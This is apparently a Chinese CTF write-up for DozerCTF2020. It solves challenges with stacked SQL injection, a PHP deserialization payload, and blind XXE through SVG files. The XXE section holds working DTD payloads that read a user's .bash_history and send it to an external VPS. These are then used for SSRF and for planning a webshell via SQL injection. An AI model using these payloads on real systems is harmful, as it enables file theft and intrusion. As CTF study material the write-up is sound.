---
title: DozerCTF2020_web
date: 2020-06-15
image: 
description: 金陵科技学院主办的CTF比赛
categories: 
- ctf_writeup
tags:
- XXE
- SQLi
---
又是一场把萌新骗过去杀的比赛，弹计算器好玩，域渗透不会，xxe盲打ssrf学到了

------

### sqli-labs 0

考点：URL二次编码，堆叠注入

堆叠其实很简单，也发现什么过滤，主要是二次编码有点坑。。。

查看库名：

```
?id=1%2527;show%20databases;%23 
```

查看表名：

 

```
?id=1%2527;show%20tables;%23
```

查看表的第一条数据：

 

```
?id=1%2527;handler%20uziuzi%20open;handler%20uziuzi%20read%20first;%23 
```

flag{594cb6af684ad354b4a59ac496473990}

 

 

 

 

### 白给的反序列化

考点：PHP反序列化

开题送码：

```
<?php

class home
{
    private $method;
    private $args;
    function __construct($method, $args)
    {
        $this->method = $method;
        $this->args = $args;
    }

    function __destruct()
    {
        if (in_array($this->method, array("mysys"))) {
            call_user_func_array(array($this, $this->method), $this->args);
        }
    }

    function mysys($path)
    {
        print_r(base64_encode(exec("cat $path")));
    }
    function waf($str)
    {
        if (strlen($str) > 8) {
            die("No");
        }
        return $str;
    }

    function __wakeup()
    {
        $num = 0;
        foreach ($this->args as $k => $v) {
            $this->args[$k] = $this->waf(trim($v));
            $num += 1;
            if ($num > 2) {
                die("No");
            }
        }
    }
}

if ($_GET['path']) {
    $path = @$_GET['path'];
    unserialize($path);
} else {
    highlight_file(__FILE__);

}
?>
```

核心是在 `mysys` 函数，可以返回base64编码之后的exec内容；

而 `__destruct` 里面首先是一个 `in_array` 的判断，如果 `$this->method` 的值是在一个数组里面的话，就执行 `call_user_func_array` ，而这个数组只有一个元素那就是 `mysys` ，所以我们method就传入mysys字符串就行。

至于call_user_func_array，PHP手册是这样写的：

```
mixed call_user_func_array ( callable $callback , array $param_arr )
把第一个参数作为回调函数（callback）调用，把参数数组作（param_arr）为回调函数的的参数传入。

callback
  被调用的回调函数。
param_arr
  要被传入回调函数的数组，这个数组得是索引数组。
```

那么我们只需要给 `$args` 赋一个数组就行了；

```
'''
  题目源码
'''

$pop = new home('mysys',array('flag.php'));
echo serialize($pop);
```

得到 `O:4:"home":2:{s:12:" home method";s:5:"mysys";s:10:" home args";a:1:{i:0;s:8:"flag.php";}}` 注入private对象加个%00就行。

payload:

```
?path=O:4:"home":2:{s:12:"%00home%00method";s:5:"mysys";s:10:"%00home%00args";a:1:{i:0;s:8:"flag.php";}}
```

flag{j4nc920fm8b2z0r2mc7dsf87s6785a675sa776vd}

 

 

 

### 简单域渗透-flag1

考点：CVE-2020-7961 Liferay Portal 反序列化

请移步本站：[CVE-2020-7961 Liferay Portal 反序列化-复现](http://wh1sper.com/cve-2020-7961liferay-portal-反序列化-复现/)

 

 

 

### svgggggg!

考点：XXE盲打，SSRF，sqli写shell

打开题目，叫我们给一个URL，然后check这个URL指向的file是不是svg图片

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120171235.png)

#### 什么是SVG？

- SVG 指可伸缩矢量图形 (Scalable Vector Graphics)
- SVG 用来定义用于网络的基于矢量的图形
- SVG 使用 XML 格式定义图形
- SVG 图像在放大或改变尺寸的情况下其图形质量不会有所损失
- SVG 是万维网联盟的标准
- SVG 与诸如 DOM 和 XSL 之类的 W3C 标准是一个整体

由于SVG是基于XML的矢量图，因此可以支持Entity（实体）功能。

我们自然而然地想到了XXE。

 

#### 利用SVG进行XXE攻击

我从网上搜索了一个SVG图片的源码，改装了一下，在VPS上面命名为 `1.svg` ：

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fortiguard [ 
<!ENTITY lab "HELLO">
]>
<svg xmlns="http://www.w3.org/2000/svg" height="200" width="200">
  <text y="20" font-size="20">&lab;</text>	
</svg>
```

提交地址，我们发现我们的实体已经起作用了（这里只是因为挡住了，但是F12可以看到）

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120171246.png)

那么大致就能实锤是XXE；

尝试直接读取文件：

1.svg

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fortiguard [ 
<!ENTITY lab SYSTEM "file:///home/r1ck/.bash_history">
]>
<svg xmlns="http://www.w3.org/2000/svg" height="200" width="200">
  <text y="20" font-size="20">&lab;</text>
</svg>
```

当然不可能这么简单，页面虽然正常返回信息，但是我们并不能直接读到我们想要的东西；

无回显，但是又是XXE，我们又自然地想到了XXE盲打，也就是通过加载外部一个dtd文件，然后把读取结果以HTTP请求的方式发送到自己的VPS。

构造 `entity.svg` :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fortiguard [ 
<!ENTITY lab SYSTEM "file:///home/r1ck/.bash_history">
<!ENTITY % file SYSTEM "file:///home/r1ck/.bash_history">
<!ENTITY % dtd SYSTEM "http://IP:端口/1.dtd">
%dtd;
%send;
]>
<svg xmlns="http://www.w3.org/2000/svg" height="200" width="200">
        <text y="20" font-size="20">&lab;</text>
</svg>
```

构造 `1.dtd` ：

```
<!ENTITY % all
        "<!ENTITY &#x25; send SYSTEM 'http://IP:端口/?%file;'>"
>
%all;
```

发送 `entity.svg` 地址；

我们可以看到dtd文件实际上已经被加载了，但是却没有收到读取文件之后的请求

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120171303.png)

判断问题出在读文件那一步，但是倘若我们读取的文件是一个不存在的文件，比如file:///xxx/xx.x，那么我们发送svg文件地址之后，页面是没有回显内容的；
但是如果我们读取的是一个存在的文件，页面会有回显内容。

那么我们可以推测，读文件是读到了，但是在发包的时候出了问题。

问题就出在换行和空格。

因为是GET请求发送到VPS，所以我们不能有换行和空格，不然就会400。

解决方法当然是base64。xml解析器支持使用php://filter进行编码

修改 `entity.svg` :

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fortiguard [ 
<!ENTITY lab SYSTEM "file:///home/r1ck/.bash_history">
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///home/r1ck/.bash_history">
<!ENTITY % dtd SYSTEM "http://59.110.157.4:8000/1.dtd">
%dtd;
%send;
]>
<svg xmlns="http://www.w3.org/2000/svg" height="200" width="200">
        <text y="20" font-size="20">&lab;</text>
</svg>
```

![img](https://raw.githubusercontents.com/Anthem-whisper/imgbed/master/img/20210120171320.png)

读到了.bash_history：

```
cd /app
php -S 0.0.0.0:8080
```

明显是SSRF打内网；

 

#### 利用XXE打SSRF

修改 `entity.svg` ，得到 `127.0.0.1:8080` 的源码：

```
<!doctype html>
<html>
<head>
<meta charset="UTF-8">
<title>index</title>
</head>
Hi!
You Find Me .
Flag is nearby.
<body>
</body>
</html>

Array
(
    [id] => 1
    [name] => test
)
```

可以看到是个sqli；

根据hint，我们需要直接getshell，测出来没有堆叠，但是可以联合查询

这里我们使用union select直接写一个shell到/app目录；

但是到了这里遇到了玄学原因，php一句话写进去会莫名其妙消失，等开源之后本地复现；